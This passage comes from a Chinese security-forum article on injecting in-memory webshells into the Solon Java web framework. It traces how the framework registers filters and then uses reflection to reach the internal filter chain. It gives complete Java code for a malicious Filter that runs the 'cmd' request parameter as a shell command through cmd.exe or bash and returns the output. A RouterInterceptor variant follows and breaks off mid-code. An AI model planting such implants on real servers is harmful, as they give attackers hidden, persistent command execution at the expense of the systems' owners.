---
title: Solon框架注入内存马
url: https://forum.butian.net/share/3700
source: 奇安信攻防社区
date: 2024-09-06
fetch_date: 2025-10-06T18:20:42.338691
---

# Solon框架注入内存马

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Solon框架注入内存马

* [渗透测试](https://forum.butian.net/topic/47)

Solon是Java “新的”应用开发框架，类似Spring boot ，号称Java “纯血国产”应用开发框架

Solon框架注入内存马
============
Solon简介
-------
Solon是Java “新的”应用开发框架，类似Spring boot ，号称Java “纯血国产”应用开发框架
[Github地址](https://github.com/opensolon/solon)
[官网](https://solon.noear.org/)
架构图：
![solon\_schema.png](https://github.com/opensolon/solon/blob/main/solon\_schema.png?raw=true)
请求处理过程
------
![img](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-96cc79200c4bc2746844c9c24ad04105a550a07f.jpeg%3Bcharset%3Dutf-8)
Web处理会经过四个路段：过滤器（Filter）-&gt;路由拦截器(RouterInterceptor)-&gt;处理器(Handler)-&gt;拦截器(Interceptor)
Filter内存马
---------
去官方下载了个[demo](https://solon.noear.org/start/)
根据[官方文档web开发部分](https://solon.noear.org/article/206)编写了个简单的Filter
```java
@Component(index = 0) //index 为顺序位（不加，则默认为0）
public class FilterDemo implements Filter {
   @Override
   public void doFilter(Context ctx, FilterChain chain) throws Throwable {
       System.out.println(ctx.path());  //输出当前访问路径
       chain.doFilter(ctx);
  }
}
```
在System.out.println(ctx.path());下断点，查看这个Filter是如何被添加的
首先查看第一个被调用的doFilter（org.noear.solon.core.ChainManager）
![image-20240810193642799](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-ac2d08c3b626c326571d53207532ca62edd97d70.png)
![image-20240810193741350](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-0ee712bc6fb50abc4f7dc62a09ab543880e8debc.png)
这第一个doFilter的作用是构建filter链，this.filterNodes里面的几个filter中，已经存在了前面编写的`FilterDemo`
往前看看FilterDemo是怎样被添加到this.filterNodes里的
在addFilter和addFilterIfAbsent方法里添加
![image-20240810195058866](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-9d611de8560c46433e51682e781f0c4253c4345e.png)
![image-20240810195234212](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-46ada8b8476149a766484c9f0aea2007e4f7c30d.png)
接下来是找哪里调用这个addFilter或者addFilterIfAbsent
来到org.noear.solon.SolonApp的tryHandle方法
![image-20240810194758282](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-ccb1e9c5a9b11e2dd5ae62398e524ce9873a1fc8.png)
跟进this.chainManager()来到org.noear.solon.core.route.RouterWrapper
![image-20240810195953153](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-7c8989a32a7346486cbce0ed68a4870079207cf0.png)
这个this.\\_chainManager是ChainManager对象，往前看可以看到addFilter()
![image-20240810200210499](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-52a2be392118ff8cd43c644681cbd5c0507a32c3.png)
到这里，可以清晰的知道，如果能通过上下文获取到`\_chainManager`这个field，就能够添加任意的Filter了
下一步就是想办法获取到`\_chainManager`这个field，这里借助了工具[Java Object Searcher](https://github.com/c0ny1/java-object-searcher)
编写代码搜索目标对象
```java
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField\_type("\_chainManager").build());
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
searcher.setIs\_debug(true);
searcher.setMax\_search\_depth(20);
searcher.setReport\_save\_path("C:\\Users\\XXX\\Desktop\\demo");
searcher.searchObject();
```
搜索结果：
```java
TargetObject = {java.lang.Thread}
---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
  ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
  ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
    ---> value = {org.noear.solon.boot.smarthttp.http.SmHttpContext}
    ---> \_request = {org.smartboot.http.server.impl.HttpRequestImpl}
      ---> request = {org.smartboot.http.server.impl.Request}
        ---> serverHandler = {org.noear.solon.boot.smarthttp.http.SmHttpContextHandler}
        ---> handler = {org.noear.solon.boot.smarthttp.XPluginImp$$Lambda$97/1745043985}
          ---> arg$1 = {org.noear.solon.SolonApp}
            ---> \_chainManager = {org.noear.solon.core.ChainManager}
```
其中`value = {org.noear.solon.boot.smarthttp.http.SmHttpContext}`是当前的上下文
![image-20240810201632619](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-817a3aa311af00449edb39481de106adee24c630.png)
在查询[官方文档](https://solon.noear.org/article/216)的过程中，可以得到几种获取当前上下文的方法,其中`Context ctx = Context.current();`是最合适的，它是基于 ThreadLocal 实现的
综上，得到注入Filter内存马的实现代码：
```php
Context ctx = Context.current();
Object \_request = getfieldobj(ctx,"\_request");
Object request = getfieldobj(\_request,"request");
Object serverHandler = getfieldobj(request,"serverHandler");
Object handler = getfieldobj(serverHandler,"handler");
Object arg$1 = getfieldobj(handler,"arg$1");
ChainManager \_chainManager = (ChainManager) getfieldobj(arg$1,"\_chainManager");
\_chainManager.addFilter(new Memshellclass(),0);
```
其中`refgetFileobj`方法如下：
```java
public Object getfieldobj(Object obj, String Filename) throws NoSuchFieldException, IllegalAccessException {
   try{
       Field field = obj.getClass().getDeclaredField(Filename);
       field.setAccessible(true);
       Object fieldobj = field.get(obj);
       return fieldobj;
  }catch (NoSuchFieldException e) {
       Field field = obj.getClass().getSuperclass().getDeclaredField(Filename);
       field.setAccessible(true);
       Object fieldobj = field.get(obj);
       return fieldobj;
  }
}
```
恶意Filter:
```java
public class Memshellclass implements Filter{
   @Override
   public void doFilter(Context ctx, FilterChain chain) throws Throwable {
       try{
           if(ctx.param("cmd")!=null){
               String str = ctx.param("cmd");
               try{
                   String[] cmds =
                           System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",
                                   "/c", str} : new String[]{"/bin/bash", "-c", str};
                   String output = (new java.util.Scanner((new
                           ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();
                   ctx.output(output);
              }catch (Exception e) {
                   e.printStackTrace();
              }
          }
      }catch (Throwable e){
           ctx.output(e.getMessage());
      }
       chain.doFilter(ctx);
  }
}
```
RouterInterceptor内存马
--------------------
RouterInterceptor内存马和Filter内存马差不多，其实在上面的initRouter方法已经发现了`addInterceptor`方法调用了
![image-20240810212454987](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-fa50c84eaae224a036b97498bbd1c7769520edd6.png)
只需要把`\_chainManager.addFilter`修改为`addInterceptor`即可
```java
Context ctx = Context.current();
Object \_request = getfieldobj(ctx,"\_request");
Object request = getfieldobj(\_request,"request");
Object serverHandler = getfieldobj(request,"serverHandler");
Object handler = getfieldobj(serverHandler,"handler");
Object arg$1 = getfieldobj(handler,"arg$1");
ChainManager \_chainManager = (ChainManager) getfieldobj(arg$1,"\_chainManager");
\_chainManager.addInterceptor(new RouterInterceptormemshell(),0);
```
其中恶意RouterInterceptor
```java
public class RouterInterceptormemshell implements RouterInterceptor{
       @Override
       public PathRule pathPatterns() {
           return new PathRule().include("/hello"); //限定路径，可以为return null;即作用于全路径
      }
       @Override
       public void doIntercept(Context ctx, Handler mainHandler, RouterInterceptorChain chain) throws Throwable {
           try{
               if(ctx.param("cmd")!=null){
                   String str = ctx.param("cmd");
                   try{
                  ...